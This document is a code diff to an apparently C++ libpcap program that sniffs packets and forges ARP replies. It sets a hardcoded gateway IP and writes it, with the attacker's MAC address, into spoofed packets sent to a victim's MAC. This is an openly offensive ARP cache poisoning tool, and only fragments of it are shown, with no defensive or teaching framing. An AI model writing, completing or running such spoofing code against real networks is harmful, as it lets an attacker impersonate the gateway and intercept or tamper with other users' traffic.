@@ -79,7 +79,7 @@ struct sniff_tcp {
         u_short th_urp;                 /* urgent pointer */
 };
 
-typedef struct sniff_arp {
+struct sniff_arp {
 #define ARP_REQUEST 1   /* ARP Request             */
 #define ARP_REPLY 2     /* ARP Reply               */
     u_int16_t htype;    /* Hardware Type         2  */
@@ -101,7 +101,7 @@ u_char victim_ip[4];
 
 u_char victim_mac[6];
 
-
+u_char gateway_ip[4] ={ 192,168,32,254};
 
 bool found=false;
 
@@ -127,7 +127,7 @@ int getIPAddress()
     string first[4];
 
    int k=0;
-    for(int i=20;i<33;i++)
+    for(int i=20;i<34;i++)
     {
 
         if(buff[i]=='.')
@@ -135,7 +135,7 @@ int getIPAddress()
             k++;
             continue;
         }
-        first[k]=first[k]+buff[i];
+        if(buff[i]>47 && buff[i] < 58 ) first[k]=first[k]+buff[i];
 
     }
     int n0=atoi(first[0].c_str());
@@ -368,7 +368,6 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
     /*
      * Print payload data; it might be binary, so don't just
      * treat it as a string.
-
     if (size_payload > 0) {
         printf("   Payload (%d bytes):\n", size_payload);
         print_payload(payload, size_payload);
@@ -474,7 +473,6 @@ int main(int argc, char **argv)
         packets[3]=0x3E;
         packets[4]=0x02;
         packets[5]=0x3D;
-
          *  set mac source tomy mac
 */
         packets[6]=attacker_mac[0];
@@ -543,10 +541,10 @@ int main(int argc, char **argv)
            packets[21]=0x02;
 
            //change ip to gateway ip
-           packets[28]=192;
-           packets[29]=168;
-           packets[30]=0;
-           packets[31]=1;
+           packets[28]=gateway_ip[0];
+           packets[29]=gateway_ip[1];
+           packets[30]=gateway_ip[2];
+           packets[31]=gateway_ip[3];
 
            //dest mac
            packets[32]=victim_mac[0];
